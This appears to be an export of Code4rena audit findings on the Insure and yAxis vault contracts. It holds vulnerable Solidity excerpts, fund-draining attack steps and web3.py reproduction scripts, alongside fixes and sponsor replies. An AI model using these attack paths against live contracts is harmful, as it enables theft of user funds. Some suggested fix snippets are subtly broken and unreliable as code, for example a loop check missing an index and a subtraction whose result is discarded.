    if (keeper != address(0)) {
        require(msg.sender == keeper, ""ERROR_NOT_KEEPER"");
    }
    _amount = available(); //balance
    if (_amount > 0) {
        IERC20(token).safeTransfer(address(controller), _amount);
        balance -= _amount;
        controller.earn(address(token), _amount);
    }
}
```

A malicious `controller` contract can transfer funds from the Vault to the attacker.

#### Proof of Concept

A malicious/compromised can:

1.  Call `Vault#setController()` and set `controller` to a malicious contract;
    *   L489 the old controller will transfer funds to the new, malicious controller.
2.  Call `Vault#utilize()` to deposit all the balance in the Vault contract into the malicious controller contract.
3.  Withdraw all the funds from the malicious controller contract.

#### Recommendation

Consider disallowing `Vault#setController()` to set a new address if a controller is existing, which terminates the possibility of migrating funds to a specified address provided by the owner. Or, putting a timelock to this function at least."
71.md,A malicious/compromised Registry or Factory admin can drain all the funds from the Vault contracts,high,"<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L52-L58>

```solidity
modifier onlyMarket() {
    require(
        IRegistry(registry).isListed(msg.sender),
        ""ERROR_ONLY_MARKET""
    );
    _;
}
```

<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L201-L206>

```solidity
function borrowValue(uint256 _amount, address _to) external onlyMarket override {
    debts[msg.sender] += _amount;
    totalDebt += _amount;

    IERC20(token).safeTransfer(_to, _amount);
}
```

The current design/implementation allows a market address (registered on the `registry`) to call `Vault#borrowValue()` and transfer tokens to an arbitrary address.

#### Proof of Concept

See the PoC section on \[WP-H24].

#### Recommendation

1.  Consider adding constrains (eg. timelock) to `Registry#supportMarket()`.
2.  Consdier adding constrains (upper bound for each pool, and index pool for example) to `Vault#borrowValue()`."
71.md,`PoolTemplate.sol#resume()` Wrong implementation of `resume()` will compensate overmuch redeem amount from index pools,high,"Wrong arithmetic.

***

<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L700-L717>

```solidity
uint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /
            totalLiquidity();
    uint256 _actualDeduction;
    for (uint256 i = 0; i < indexList.length; i++) {
        address _index = indexList[i];
        uint256 _credit = indicies[_index].credit;
        if (_credit > 0) {
            uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /
                _totalCredit;
            uint256 _redeemAmount = _divCeil(
                _deductionFromIndex,
                _shareOfIndex
            );
            _actualDeduction += IIndexTemplate(_index).compensate(
                _redeemAmount
            );
        }
    }
```

#### Proof of Concept

*   totalLiquidity = 200,000\* 10\*\*18;

*   totalCredit = 100,000 \* 10\*\*18;

*   debt = 10,000 \* 10\*\*18;

*   \[Index Pool 1] Credit = 20,000 \* 10\*\*18;

*   \[Index Pool 2] Credit = 30,000 \* 10\*\*18;

```
uint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /
            totalLiquidity();
// _deductionFromIndex = 10,000 * 10**6 * 10**18;

```

\[Index Pool 1]:
```solidity

uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) / _totalCredit;  
//  _shareOfIndex = 200000

uint256 _redeemAmount = _divCeil(
    _deductionFromIndex,
    _shareOfIndex
);

// _redeemAmount = 25,000 * 10**18;
```
\[Index Pool 2]:
```solidity
uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) / _totalCredit;  
//  _shareOfIndex = 300000

uint256 _redeemAmount = _divCeil(
    _deductionFromIndex,
    _shareOfIndex
);

// _redeemAmount = 16666666666666666666667 (~ 16,666 * 10**18)
```
In most cases, the transaction will revet on underflow at:
```solidity
uint256 _shortage = _deductionFromIndex /
    MAGIC_SCALE_1E6 -
    _actualDeduction;
```
In some cases, specific pools will be liable for unfair compensation:

If the CSD is empty, `Index Pool 1` only have `6,000 * 10**18` and `Index Pool 2` only have `4,000 * 10**18`, the `_actualDeduction` will be `10,000 * 10**18`, `_deductionFromPool` will be `0`.

`Index Pool 1` should only pay `1,000 * 10**18`, but actually paid `6,000 * 10**18`, the LPs of `Index Pool 1` now suffer funds loss.

#### Recommendation

Change to:

```solidity
uint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) / totalLiquidity();
uint256 _actualDeduction;
for (uint256 i = 0; i < indexList.length; i++) {
    address _index = indexList[i];
    uint256 _credit = indicies[_index].credit;
    if (_credit > 0) {
        uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /
            _totalCredit;
        uint256 _redeemAmount = _divCeil(
            _deductionFromIndex * _shareOfIndex,
            MAGIC_SCALE_1E6 * MAGIC_SCALE_1E6
        );
        _actualDeduction += IIndexTemplate(_index).compensate(
            _redeemAmount
        );
    }
}
```"
71.md,`IndexTemplate.sol` Wrong implementation allows lp of the index pool to resume a locked `PayingOut` pool and escape the responsibility for the compensation,high,"Based on the context, the system intends to lock all the lps during PayingOut period.

However, the current implementation allows anyone, including LPs to call `resume()` and unlock the index pool.

It allows a malicious LP to escape the responsibility for the compensation, at the expense of other LPs paying more than expected.

<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L459-L471>

```solidity
function resume() external override {
    uint256 _poolLength = poolList.length;

    for (uint256 i = 0; i < _poolLength; i++) {
        require(
            IPoolTemplate(poolList[i]).paused() == false,
            ""ERROR: POOL_IS_PAUSED""
        );
    }

    locked = false;
    emit Resumed();
}
```

#### Recommendation

Change to:

```solidity
function resume() external override {
   uint256 _poolLength = poolList.length;

   for (uint256 i = 0; i < _poolLength; i++) {
       require(
           IPoolTemplate(poolList[i]).marketStatus() == MarketStatus.Trading,
           ""ERROR: POOL_IS_PAYINGOUT""
       );
   }

   locked = false;
   emit Resumed();
}
```"
71.md,Admin of the index pool can `withdrawCredit()` after `applyCover()` to avoid taking loss for the compensation paid for a certain pool,high,"In the current implementation, when an incident is reported for a certain pool, the index pool can still `withdrawCredit()` from the pool, which in the best interest of an index pool, the admin of the index pool is preferred to do so.

This allows the index pool to escape from the responsibility for the risks of invested pools.

Making the LPs of the pool take an unfair share of the responsibility.

##### Proof of Concept

*   Pool A `totalCredit` = 10,000
*   Pool A `rewardPerCredit` = 1

1.  \[Index Pool 1] allocates 1,000 credits to Pool `A`:

*   `totalCredit` = 11,000
*   indicies\[Index Pool 1] = 1,000

2.  After a while, Pool A `rewardPerCredit` has grown to `1.1`, and `applyCover()` has been called, \[Index Pool 1] call `withdrawCredit()` get 100 premium

*   `totalCredit` = 10,000
*   indicies\[Index Pool 1] = 0

3.  After `pendingEnd`, the pool `resume()`,\[ Index Pool 1] will not be paying for the compensation since `credit` is 0.

In our case, \[Index Pool 1] earned premium without paying for a part of the compensation.

#### Recommendation

Change to:

<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L416-L421>

```solidity
function withdrawCredit(uint256 _credit)
    external
    override
    returns (uint256 _pending)
{
    require(
        marketStatus == MarketStatus.Trading,
        ""ERROR: WITHDRAW_CREDIT_BAD_CONDITIONS""
    );
    IndexInfo storage _index = indicies[msg.sender];
```

 > We should lock the credit control when pool is in payout status.
> This implementation, still allows small amount of withdraw, for users who were requested Withdraw."
71.md,repayDebt in Vault.sol could DOS functionality for markets,medium,"Any user can pay the debt for any borrower in `Vault.sol`, by using `repayDebt()`. This function allows anyone to repay any amount of borrowed value, up-to and including the `totalDebt` value; it works by setting the `debts[_target]` to zero, and decreasing `totalDebt` by the given amount, up to zero. However, all debts of the other borrowers are left untouched.

If a malicious (but generous) user were to repay the debt for all the borrowers, markets functionality regarding borrowing would be DOSed: the vault would try to decrease the debt of the market, successfully, but would fail to decrease `totalDebt` as it would result in an underflow

#### Proof of Concept

<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L257>


#### Recommended Mitigation Steps

Make `repayDebt()` accept an amount up-to and including the value of the debt for the given borrower"
71.md,Owner can call `applyCover` multiple times in `PoolTemplate.sol`,medium,"The owner could potentially extend the insurance period indefinitely in the `applyCover` function without ever allowing the market to resume. This is because there is no check in `applyCover` to ensure that the market is in a `Trading` state.

This can also allow the owner to emit fraudulent `MarketStatusChanged` events.

#### Recommended Mitigation Steps

Require that the market be in a `Trading` state to allow another `applyCover` call."
71.md,Signature replay,medium,"Signature replay in `PoolTemplate`.

#### Proof of Concept

The `redeem` method of `PoolTemplate` verifies the data stored in `incident`, and the verification logic of this process is performed as following:
```solidity
require(
    MerkleProof.verify(
        _merkleProof,
        _targets,
        keccak256(
            abi.encodePacked(_insurance.target, _insurance.insured)
        )
    ) ||
        MerkleProof.verify(
            _merkleProof,
            _targets,
            keccak256(abi.encodePacked(_insurance.target, address(0)))
        ),
    ""ERROR: INSURANCE_EXEMPTED""
);
```

As can be seen, the only data related to the `_insurance` are`  target ` and `insured`, so as the incident has no relation with the`  Insurance `, apparently nothing prevents a user to call `insure` with high amounts, after receive the incident, the only thing that prevents this from being reused is that the owner creates the incident with an `_incidentTimestamp` from the past.

So if an owner create a incident from the future it's possible to create a new `insure` that could be reused by the same affected address.

Another lack of input verification that could facilitate this attack is the `_span=0` in the `insure` method.


#### Recommended Mitigation Steps

It is mandatory to add a check in `applyCover` that`  _incidentTimestamp ` is less than the current date and the `span` argument is greater than 0 in the`  insure ` method."
71.md,System Debt Is Not Handled When Insurance Pools Become Insolvent,medium,"If an incident has occurred where an insurance policy is to be redeemed. The market is put into the `MarketStatus.Payingout` mode where the `_insurance.insured` account is allowed to redeem their cover and receive a payout amount. Upon paying out the insurance cover, any user is able to resume the market by calling `PoolTemplate.resume()`. This function will compensate the insurance pool if it is insolvent by querying `IndexTemplate.compensate()` which in turn queries `CDSTemplate.compensate()` to cover any shortage.

In the event none of these entities are able to cover the shortage in debt, the system accrues the debt. However, there is currently no mechanism to ensure when `transferDebt()` is called in `PoolTemplate.resume()`, the accrued system debt is paid off. Therefore, the system may incorrectly handle insolvency on an extreme edge case, generating system instability.

#### Proof of Concept

<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L691-L734>
```solidity
function resume() external {
    require(
        marketStatus == MarketStatus.Payingout &&
            pendingEnd < block.timestamp,
        ""ERROR: UNABLE_TO_RESUME""
    );

    uint256 _debt = vault.debts(address(this));
    uint256 _totalCredit = totalCredit;
    uint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /
        totalLiquidity();
    uint256 _actualDeduction;
    for (uint256 i = 0; i < indexList.length; i++) {
        address _index = indexList[i];
        uint256 _credit = indicies[_index].credit;
        if (_credit > 0) {
            uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /
                _totalCredit;
            uint256 _redeemAmount = _divCeil(
                _deductionFromIndex,
                _shareOfIndex
            );
            _actualDeduction += IIndexTemplate(_index).compensate(
                _redeemAmount
            );
        }
    }

    uint256 _deductionFromPool = _debt -
        _deductionFromIndex /
        MAGIC_SCALE_1E6;
    uint256 _shortage = _deductionFromIndex /
        MAGIC_SCALE_1E6 -
        _actualDeduction;

    if (_deductionFromPool > 0) {
        vault.offsetDebt(_deductionFromPool, address(this));
    }

    vault.transferDebt(_shortage);

    marketStatus = MarketStatus.Trading;
    emit MarketStatusChanged(MarketStatus.Trading);
}
```
- <https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L421-L450>
- <https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L248-L277>


#### Recommended Mitigation Steps

Consider devising a mechanism to ensure system debt is properly handled. After discussions with the sponsor, it seems that they will be implementing a way to mint `INSURE` tokens which will be used to cover the shortfall.


 > yes, PoolTemplate calls transferDebt() to make his debt to the system debt in case all Index and CDS layers couldn't cover the shortage.
> In this case, we have to repay the system debt somehow since this is the situation that we over-lose money. One way is that someone calls repayDebt() and pay for it (not realistic at all). As we implement the way to payback, we are considering minting INSURE token or, other better mechanism.
> 
 > This is not developed yet, and acknowledged."
71.md,`Vault.sol` Tokens with fee on transfer are not supported,medium,"There are ERC20 tokens that charge fee for every `transfer()` / `transferFrom()`.

`Vault.sol#addValue()` assumes that the received amount is the same as the transfer amount, and uses it to calculate attributions, balance amounts, etc. While the actual transferred amount can be lower for those tokens.

<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L124-L140>

```solidity
function addValue(
    uint256 _amount,
    address _from,
    address _beneficiary
) external override onlyMarket returns (uint256 _attributions) {

    if (totalAttributions == 0) {
        _attributions = _amount;
    } else {
        uint256 _pool = valueAll();
        _attributions = (_amount * totalAttributions) / _pool;
    }
    IERC20(token).safeTransferFrom(_from, address(this), _amount);
    balance += _amount;
    totalAttributions += _attributions;
    attributions[_beneficiary] += _attributions;
}
```

#### Recommendation

Consider comparing before and after balance to get the actual transferred amount."
71.md,Index compensate is 0 when totalLiquidity() is enough to cover the whole amount,medium,"In IndexTemplate, function compensate, When `\_amount > \_value`, and `<= totalLiquidity()`, the value of `\_compensated` is not set, so it gets a default value of 0:

```solidity
if (_value >= _amount) {
    ...
    _compensated = _amount;
} else {
    ...
    if (totalLiquidity() < _amount) {
        ...
        _compensated = _value + _cds;
    }
    vault.offsetDebt(_compensated, msg.sender);
}
```

But nevertheless, in both cases, it calls `vault.offsetDebt`, even when the`\_compensated` is 0 (no else block).

#### Recommended Mitigation Steps

I think, in this case, it should try to redeem the premium (withdrawCredit?) to cover the whole amount, but I am not sure about the intentions as I didn't have enough time to understand this protocol in depth."
71.md,`requestWithdraw` without obligation to withdraw allow underwriter to avoid payout,medium,"To prevent withdrawal front-running, a lockup period is set between withdrawal request and withdrawal. However, there are no obligation to withdraw after the lockup period and the capital will keep earning premium during lockup. A strategy for underwriter is to keep requesting withdrawal every `lockup period` to keep their average lockup to `lockup period/2`.

#### Proof of Concept

<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L279>

Assuming

1.  Reporting DAO vote last for 24 hours (according to docs) plus there will be delay between the hack and vote creation
2.  the `lockup period` is set to 86400 (24 hours) in the supplied test cases

It is very likely an underwriter can avoid payout by such strategy since their effective lockup would be 12 hours only. They will continue to earn yield in the pool and only require some extra gas cost for the `requestWithdraw` every 24 hours.

#### Recommended Mitigation Steps

Extend the lockup period at least by a factor of 2 or force underwriter to withdraw after lockup period."
71.md,Unbounded iteration over all indexes (2),medium,"The transactions could fail if the array get too big and the transaction would consume more gas than the block limit.
This will then result in a denial of service for the desired functionality and break core functionality.

#### Proof of Concept

<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L703>

#### Tools Used

VS Code

#### Recommended Mitigation Steps

Keep the array size small."
30.md,`Controller.setCap` sets wrong vault balance,high,"The `Controller.setCap` function sets a cap for a strategy and withdraws any excess amounts (`_diff`).
The vault balance is decreased by the entire strategy balance instead of by this `_diff`:

```solidity
// @audit why not sub _diff?
_vaultDetails[_vault].balance = _vaultDetails[_vault].balance.sub(_balance);
```

#### Impact
The `_vaultDetails[_vault].balance` variable does not correctly track the actual vault balances anymore, it will usually **underestimate** the vault balance.
This variable is used in `Controller.balanceOf()`, which in turn is used in `Vault.balance()`, which in turn is used to determine how many shares to mint / amount to receive when redeeming shares.
If the value is less, users will lose money as they can redeem fewer tokens.
Also, an attacker can `deposit` and will receive more shares than they should receive. They can then wait until the balance is correctly updated again and withdraw their shares for a higher amount than they deposited. This leads to the vault losing tokens.

#### Recommended Mitigation Steps
Sub the `_diff` instead of the `balance`: `_vaultDetails[_vault].balance = _vaultDetails[_vault].balance.sub(_diff);`"
30.md,set cap breaks vault's Balance,high,"#### Impact
In controller.sol's function `setCap`, the contract wrongly handles `_vaultDetails[_vault].balance`. While the balance should be decreased by the difference of strategies balance, it subtracts the remaining balance of the strategy. See [Controller.sol L262-L278](https://github.com/code-423n4/2021-09-yaxis/blob/main/contracts/v3/controllers/Controller.sol#L262-L278).
`_vaultDetails[_vault].balance = _vaultDetails[_vault].balance.sub(_balance);`

This would result in `vaultDetails[_vault].balance` being far smaller than the strategy's value. A user would trigger the assertion at [Controller.sol#475](https://github.com/code-423n4/2021-09-yaxis/blob/main/contracts/v3/controllers/Controller.sol#L475) and the fund would be locked in the strategy.

Though `setCap` is a permission function that only the operator can call, it's likely to be called and the fund would be locked in the contract. I consider this a high severity issue.

#### Proof of Concept
We can trigger the issue by setting the cap 1 wei smaller than the strategy's balance.

```python
strategy_balance = strategy.functions.balanceOf().call()
controller.functions.setCap(vault.address, strategy.address, strategy_balance - 1, dai.address).transact()

## this would be reverted
vault.functions.withdrawAll(dai.address).transact()
```

#### Tools Used
Hardhat

#### Recommended Mitigation Steps
I believe the dev would spot the issue in the test if `_vaultDetails[_vault].balance` is a public variable.

One possible fix is to subtract the difference of the balance.

```solidity
uint previousBalance = IStrategy(_strategy).balanceOf();
_vaultDetails[_vault].balance.sub(previousBalance.sub(_amount));
```"
30.md,No safety check in `addToken`,high,"#### Impact
There's no safety check in `Manager.sol` `addToken`. There are two possible cases that might happen.

1.  One token being added twice in a Vault. Token would be counted doubly in the vault. Ref: [Vault.sol#L293-L303](https://github.com/code-423n4/2021-09-yaxis/blob/main/contracts/v3/Vault.sol#L293-L303). There would be two item in the array when querying `manager.getTokens(address(this));`.

2.  A token first being added to two vaults. The value calculation of the first vault would be broken. As `vaults[_token] = _vault;` would point to the other vault.

Permission keys should always be treated cautiously. However, calling the same initialize function twice should not be able to destroy the vault. Also, as the protocol develops, there's likely that one token is supported in two vaults. The DAO may mistakenly add the same token twice. I consider this a high-risk issue.

#### Proof of Concept
Adding same token twice would not raise any error here.
```solidity
    manager.functions.addToken(vault.address, dai.address).transact()
    manager.functions.addToken(vault.address, dai.address).transact()
```
#### Tools Used
Hardhat

#### Recommended Mitigation Steps
I recommend to add two checks

```solidity
require(vaults[_token] == address(0));
bool notFound = True;
for(uint256 i; i < tokens[_vault].length; i++) {
    if (tokens[_vault] == _token) {
        notFound = False;
    }
}
require(notFound, ""duplicate token"");
```"
30.md,Controller does not raise an error when there's insufficient liquidity,high,"#### Impact
When a user tries to withdraw the token from the vault, the vault would withdraw the token from the controller if there's insufficient liquidity in the vault. However, the controller does not raise an error when there's insufficient liquidity in the controller/ strategies. The user would lose his shares while getting nothing.

An MEV searcher could apply this attack on any withdrawal. When an attacker found an unconfirmed tx that tries to withdraw 1M dai, he can do such sandwich attack.

1.  Deposits USDC into the vault.
2.  Withdraw all dai left in the vault/controller/strategy.
3.  Place the vitims tx here. The victim would get zero dai while burning 1 M share. **This would pump the share price.**
4.  Withdraw all liquidity.

All users would be vulnerable to MEV attackers. I consider this is a high-risk issue.

#### Proof of Concept
Here's web3.py script to reproduce the issue.

```python
deposit_amount = 100000 * 10**18
user = w3.eth.accounts[0]
get_token(dai, user, deposit_amount)
dai.functions.approve(vault.address, deposit_amount + margin_deposit).transact()
vault.functions.deposit(dai.address, deposit_amount).transact()
vault.functions.withdrawAll(usdt.address).transact()

#
print(""usdt amount: "", usdt.functions.balanceOf(user).call())
```

#### Recommended Mitigation Steps
There are two issues involved.
First, users pay the slippage when they try to withdraw. I do not find this fair. Users have to pay extra gas to withdraw liquidity from strategy, convert the token, and still paying the slippage. I recommend writing a view function for the frontend to display how much slippage the user has to pay ([Controler.sol L448-L479](https://github.com/code-423n4/2021-09-yaxis/blob/main/contracts/v3/controllers/Controller.sol#L448-L479)).

Second, the controller does not revert the transaction there's insufficient liquidity ([Controller.sol#L577-L622](https://github.com/code-423n4/2021-09-yaxis/blob/main/contracts/v3/controllers/Controller.sol#L577-L622)).

Recommend to revert the transaction when `_amount` is not equal to zero after the loop finishes.




**BobbyYaxis (yAxis) noted:**
> We have mitigated by deploying vaults that only accept the Curve LP token itself used in the strategy. There is no longer an array of tokens accepted. E.g Instead of a wBTC vault, we have a renCrv vault. Or instead of 3CRV vault, we have a mimCrv vault. The strategy want token = the vault token."
30.md,Vault treats all tokens exactly the same that creates (huge) arbitrage opportunities.,high,"#### Impact
The v3 vault treats all valid tokens exactly the same. Depositing 1M DAI would get the same share as depositing 1M USDT. User can withdraw their share in another token. Though there's `withdrawalProtectionFee` (0.1 percent), the vault is still a no slippage stable coin exchange.

Also, I notice that 3crv_token is added to the vault in the test. Treating 3crv_token and all other stable coins the same would make the vault vulnerable to flashloan attack. 3crv_token is an lp token and at the point of writing, the price of it is 1.01. The arbitrage space is about 0.8 percent and makes the vault vulnerable to flashloan attacks.

Though the team may not add crv_token and dai to the same vault, its design makes the vault vulnerable. Strategies need to be designed with super caution or the vault would be vulnerable to attackers.

Given the possibility of a flashloan attack, I consider this a high-risk issue.

#### Proof of Concept
The issue locates at the deposit function ([Vault.sol#L147-L180](https://github.com/code-423n4/2021-09-yaxis/blob/main/contracts/v3/Vault.sol#L147-L180)).
The share is minted according to the calculation here

```solidity
_shares = _shares.add(_amount);
```

The share is burned at [Vault.sol L217](https://github.com/code-423n4/2021-09-yaxis/blob/main/contracts/v3/Vault.sol#L217)
```solidity
uint256 _amount = (balance().mul(_shares)).div(totalSupply());
```

Here's a sample exploit in web3.py.

```python
deposit_amount = 100000 * 10**6
user = w3.eth.accounts[0]
get_token(usdt, user, deposit_amount)
usdt.functions.approve(vault.address, deposit_amount).transact()
vault.functions.deposit(usdt.address, deposit_amount).transact()
vault.functions.withdrawAll(t3crv.address).transact()"
30.md,earn results in decreasing share price,high,"#### Impact
For a dai vault that pairs with `NativeStrategyCurve3Crv`, every time `earn()` is called, shareholders would lose money. (about 2%)

There are two issues involved. The `Vault` contract and the `controller` contract doesn't handle the price difference between the want token and other tokens.

At [Vault.sol L293](https://github.com/code-423n4/2021-09-yaxis/blob/main/contracts/v3/Vault.sol#L293-L303), when a vault calculates its value, it sums up all tokens balance. However, when the controller calculates vaults' value (at [Controller.sol L410-L436](https://github.com/code-423n4/2021-09-yaxis/blob/main/contracts/v3/controllers/Controller.sol#L410-L436)), it only adds the amount of `strategy.want` it received. (in this case, it's t3crv).

Under the current design, users who deposit dai to the vault would not get yield. Instead, they would keep losing money. I consider this a high-risk issue

#### Proof of Concept
I trigger the bug with the following web3.py script:

```python
previous_price = vault.functions.getPricePerFullShare().call()
vault.functions.available(dai.address).call()
vault.functions.earn(dai.address, strategy.address).transact()
current_price = vault.functions.getPricePerFullShare().call()
print(previous_price)
print(current_price)
```

#### Tools Used
Hardhat

#### Recommended Mitigation Steps

The protocol should decide what the balance sheet in each contract stands for and make it consistent in all cases. Take, for example, if `_vaultDetails[_vault].balance;` stands for the amount of 'want' token the vault owns, there shouldn't exist two different want in all the strategies the vault has. Also, when the vault queries controllers `function balanceOf()`, they should always multiply it by the price.





**BobbyYaxis (yAxis) noted:**
> We have mitigated by deploying vaults that only accept the Curve LP token itself used in the strategy. There is no longer an array of tokens accepted. E.g Instead of a wBTC vault, we have a renCrv vault. Or instead of 3CRV vault, we have a mimCrv vault. The strategy want token = the vault token."
30.md,`Vault.balance()` mixes normalized and standard amounts,high,"The `Vault.balance` function uses the `balanceOfThis` function which scales (""normalizes"") all balances to 18 decimals.
```solidity
for (uint8 i; i < _tokens.length; i++) {
    address _token = _tokens[i];
    // everything is padded to 18 decimals
    _balance = _balance.add(_normalizeDecimals(_token, IERC20(_token).balanceOf(address(this))));
}
```
Note that `balance()`'s second term `IController(manager.controllers(address(this))).balanceOf()` is not normalized.
The code is adding a non-normalized amount (for example 6 decimals only for USDC) to a normalized (18 decimals).

#### Impact
The result is that the `balance()` will be under-reported.
This leads to receiving wrong shares when `deposit`ing tokens, and a wrong amount when redeeming `tokens`.

#### Recommended Mitigation Steps
The second term `IController(manager.controllers(address(this))).balanceOf()` must also be normalized before adding it.
`IController(manager.controllers(address(this))).balanceOf()` uses `_vaultDetails[msg.sender].balance` which directly uses the raw token amounts which are not normalized.




**BobbyYaxis (yAxis) noted:**
> Mitigated in PR 114: https://github.com/yaxis-project/metavault/pull/114/commits/b3c0405640719aa7d43560f4b4b910b7ba88170b"
30.md,`Vault.withdraw` mixes normalized and standard amounts,high,"The `Vault.balance` function uses the `balanceOfThis` function which scales (""normalizes"") all balances to 18 decimals.
```solidity
for (uint8 i; i < _tokens.length; i++) {
    address _token = _tokens[i];
    // everything is padded to 18 decimals
    _balance = _balance.add(_normalizeDecimals(_token, IERC20(_token).balanceOf(address(this))));
}
```
Note that `balance()`'s second term `IController(manager.controllers(address(this))).balanceOf()` is not normalized, but it must be.

This leads to many issues through the contracts that use `balance` but don't treat these values as normalized values.
For example, in `Vault.withdraw`, the computed `_amount` value is normalized (in 18 decimals).
But the `uint256 _balance = IERC20(_output).balanceOf(address(this));` value is not normalized but compared to the normalized `_amount` and even subtracted:

```solidity
// @audit compares unnormalzied output to normalized output
if (_balance < _amount) {
    IController _controller = IController(manager.controllers(address(this)));
    // @audit cannot directly subtract unnormalized
    uint256 _toWithdraw = _amount.sub(_balance);
    if (_controller.strategies() > 0) {
        _controller.withdraw(_output, _toWithdraw);
    }
    uint256 _after = IERC20(_output).balanceOf(address(this));
    uint256 _diff = _after.sub(_balance);
    if (_diff < _toWithdraw) {
        _amount = _balance.add(_diff);
    }
}
```

#### Impact
Imagine in `withdraw`, the `output` is USDC with 6 decimals, then the normalized `_toWithdraw` with 18 decimals (due to using `_amount`) will be a huge number and attempt to withdraw an inflated amount.
An attacker can steal tokens this way by withdrawing a tiny amount of shares and receive an inflated USDC or USDT amount (or any `_output` token with less than 18 decimals).

#### Recommended Mitigation Steps
Whenever using anything involving `vault.balanceOfThis()` or `vault.balance()` one needs to be sure that any derived token amount needs to be denormalized again before using them.


**BobbyYaxis (yAxis) noted:**
> Mitigated in PR 114: https://github.com/yaxis-project/metavault/pull/114/commits/b3c0405640719aa7d43560f4b4b910b7ba88170b"
30.md,`removeToken` would break the vault/protocol.,high,"#### Impact
There's no safety check in Manager.sol's `removeToken`. [Manager.sol#L454-L487](https://github.com/code-423n4/2021-09-yaxis/blob/main/contracts/v3/Manager.sol#L454-L487)

1.  The token would be locked in the original vault. Given the current design, the vault would keep a ratio of total amount to save the gas. Once the token is removed at manager contract, these token would lost.
2.  Controller's `balanceOf` would no longer reflects the real value. [Controller.sol#L488-L495](https://github.com/code-423n4/2021-09-yaxis/blob/main/contracts/v3/controllers/Controller.sol#L488-L495) While `_vaultDetails[msg.sender].balance;` remains the same, user can nolonger withdraw those amount.
3.  Share price in the vault would decrease drastically. The share price is calculated as `totalValue / totalSupply` [Vault.sol#L217](https://github.com/code-423n4/2021-09-yaxis/blob/main/contracts/v3/Vault.sol#L217). While the `totalSupply` of the share remains the same, the total balance has drastically decreased.

Calling `removeToken` way would almost break the whole protocol if the vault has already started. I consider this is a high-risk issue.

#### Proof of Concept
We can see how the vault would be affected with below web3.py script.

```python
print(vault.functions.balanceOfThis().call())
print(vault.functions.totalSupply().call())
manager.functions.removeToken(vault.address, dai.address).transact()
print(vault.functions.balanceOfThis().call())
print(vault.functions.totalSupply().call())
```

output

    100000000000000000000000
    100000000000000000000000
    0
    100000000000000000000000

#### Tools Used
Hardhat

#### Recommended Mitigation Steps
Remove tokens from a vault would be a really critical job. I recommend the team cover all possible cases and check all components' states (all vault/ strategy/ controller's state) in the test.

Some steps that I try to come up with that is required to remove TokenA from a vault.

1.  Withdraw all tokenA from all strategies (and handle it correctly in the controller).
2.  Withdraw all tokenA from the vault.
3.  Convert all tokenA that's collected in the previous step into tokenB.
4.  Transfer tokenB to the vault and compensate the transaction fee/slippage cost to the vault."
30.md,An attacker can steal funds from multi-token vaults,high,"The total balance should NOT be simply added from different tokens' tokenAmounts, considering that the price of tokens may not be the same.

[`Vault.sol` L324](https://github.com/code-423n4/2021-09-yaxis/blob/cf7d9448e70b5c1163a1773adb4709d9d6ad6c99/contracts/v3/Vault.sol#L324)

```solidity
function balanceOfThis()
    public
    view
    returns (uint256 _balance)
{
    address[] memory _tokens = manager.getTokens(address(this));
    for (uint8 i; i < _tokens.length; i++) {
        address _token = _tokens[i];
        _balance = _balance.add(_normalizeDecimals(_token, IERC20(_token).balanceOf(address(this))));
    }
}
```

[`Controller.sol` L396](https://github.com/code-423n4/2021-09-yaxis/blob/cf7d9448e70b5c1163a1773adb4709d9d6ad6c99/contracts/v3/controllers/Controller.sol#L396)
```solidity
function harvestStrategy(
    address _strategy,
    uint256 _estimatedWETH,
    uint256 _estimatedYAXIS
)
    external
    override
    notHalted
    onlyHarvester
    onlyStrategy(_strategy)
{
    uint256 _before = IStrategy(_strategy).balanceOf();
    IStrategy(_strategy).harvest(_estimatedWETH, _estimatedYAXIS);
    uint256 _after = IStrategy(_strategy).balanceOf();
    address _vault = _vaultStrategies[_strategy];
    _vaultDetails[_vault].balance = _vaultDetails[_vault].balance.add(_after.sub(_before));
    _vaultDetails[_vault].balances[_strategy] = _after;
    emit Harvest(_strategy);
}
```

[`Vault.sol` L310](https://github.com/code-423n4/2021-09-yaxis/blob/cf7d9448e70b5c1163a1773adb4709d9d6ad6c99/contracts/v3/Vault.sol#L310)
```solidity
/**
 * @notice Returns the total balance of the vault, including strategies
 */
function balance()
    public
    view
    override
    returns (uint256 _balance)
{
    return balanceOfThis().add(IController(manager.controllers(address(this))).balanceOf());
}
```

#### Impact
An attacker can steal funds from multi-token vaults. Resulting in fund loss of all other users.

#### Proof of Concept
If there is a multi-token vault with 3 tokens: DAI, USDC, USDT, and their price in USD is now 1.05, 0.98, and 0.95. If the current balances are: 2M, 1M, and 0.5M.

An attacker may do the following steps:

1.  Deposit 3M of USDT;
2.  Withdraw 3M, receive 2M in DAI and 1M in USDC.

